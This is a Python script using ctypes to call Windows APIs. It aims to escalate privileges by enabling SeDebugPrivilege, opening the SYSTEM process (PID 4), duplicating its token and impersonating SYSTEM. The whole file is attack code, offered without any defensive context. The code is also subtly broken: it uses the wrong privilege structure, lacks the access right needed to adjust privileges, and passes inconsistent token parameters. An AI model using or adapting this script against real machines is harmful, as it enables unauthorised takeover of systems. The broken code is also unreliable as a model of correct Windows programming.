import ctypes

# Load necessary DLLs
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

# Define constants
TOKEN_DUPLICATE = 0x0002
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x00000002
SecurityImpersonation = 2

# Define structures
class LUID(ctypes.Structure):
    _fields_ = [("LowPart", ctypes.c_uint32), ("HighPart", ctypes.c_int32)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", ctypes.c_uint32),
        ("Privileges", LUID * 1)
    ]

def enable_privilege(privilege_name):
    hToken = ctypes.c_void_p()

    try:
        # Open the process token
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hToken)):
            raise ctypes.WinError()

        # Lookup the privilege LUID
        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
            raise ctypes.WinError()

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        # Adjust token privileges
        if not advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
            raise ctypes.WinError()

        print(f"Privilege {privilege_name} enabled successfully.")

    finally:
        # Close the token handle
        kernel32.CloseHandle(hToken)

def impersonate_system():
    enable_privilege("SeDebugPrivilege")

    system_pid = 4  # Typically, the system process ID is 4
    hSystem = kernel32.OpenProcess(0x0400 | 0x0010, False, system_pid)
    if not hSystem:
        raise ctypes.WinError()

    try:
        hToken = ctypes.c_void_p()
        if not advapi32.OpenProcessToken(hSystem, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(hToken)):
            raise ctypes.WinError()

        try:
            hNewToken = ctypes.c_void_p()
            if not advapi32.DuplicateTokenEx(hToken, TOKEN_DUPLICATE | TOKEN_QUERY, None, SecurityImpersonation, 1, ctypes.byref(hNewToken)):
                raise ctypes.WinError()

            # Impersonate the system token
            if not advapi32.ImpersonateLoggedOnUser(hNewToken):
                raise ctypes.WinError()

            print("Successfully impersonated SYSTEM.")

        finally:
            # Clean up handles
            kernel32.CloseHandle(hNewToken)
            kernel32.CloseHandle(hToken)

    finally:
        kernel32.CloseHandle(hSystem)

if __name__ == "__main__":
    impersonate_system()
